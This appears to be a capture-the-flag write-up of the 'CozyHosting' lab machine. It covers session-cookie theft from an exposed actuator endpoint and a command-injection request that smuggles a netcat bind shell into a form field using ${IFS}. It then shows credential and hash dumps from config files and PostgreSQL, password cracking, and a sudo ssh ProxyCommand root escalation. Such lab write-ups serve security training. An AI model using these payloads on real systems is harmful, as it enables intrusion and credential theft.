After scanning cozyhosting.htb with dirsearch.py I have discovered `/acutators/sessions` where are stored cookies -> cookie theft.

Next I've inspected the ssh connection fields and crafted a specific request that avoids white space filtering:

```r
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin?error=Invalid%20hostname!
Cookie: JSESSIONID=4518805508D8B807A774ACB7CF2BCD88
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

host=10.10.16.21&username=;busybox${IFS}nc${IFS}-l${IFS}-p1337${IFS}-e/bin/sh;#
```

After gaining a shell and gaining full TTY an enumartion starts:

```r
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
```


Inside application /app/.jar after downloading and unzipping, I've found database credentials:
```r
BOOT-INF/classes/application.properties
9-spring.datasource.platform=postgres
10-spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
11-spring.datasource.username=postgres
12:spring.datasource.password=Vg&nvzAQ7XxR
```

Getting into postgresql with an error: `FATAL: Peer authentication failed for user “postgres”`

```shell
psql --host=localhost --dbname=cozyhosting --username=postgres
```

pgsql enumeration:

```sql
select version();	
select current_database();
select current_user;
select session_user;
select current_setting('log_connections');
select current_setting('log_statement');
select current_setting('port');
select current_setting('password_encryption'); # scram-sha-256
select current_setting('krb_server_keyfile');
select current_setting('virtual_host');
select current_setting('port');
select current_setting('config_file');
select current_setting('hba_file');
select current_setting('data_directory');
select * from pg_shadow;
select * from pg_group;
create table myfile (input TEXT);
copy myfile from '/etc/passwd'; 
select * from myfile;copy myfile to /tmp/test;
```

tables:
```r
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

 id | username  |      hostname
----+-----------+--------------------
  1 | kanderson | suspicious mcnulty
  5 | kanderson | boring mahavira
  6 | kanderson | stoic varahamihira
  7 | kanderson | awesome lalande
```

John cracks the bcrypt with rockyou.txt as password: `manchesterunited` 

# Privilege Escalation

Inspection of `sudo -l` is allowing to use `(root) /bin/ssh *`. Which means that binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

- Spawn interactive root shell through ProxyCommand option.

```shell
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```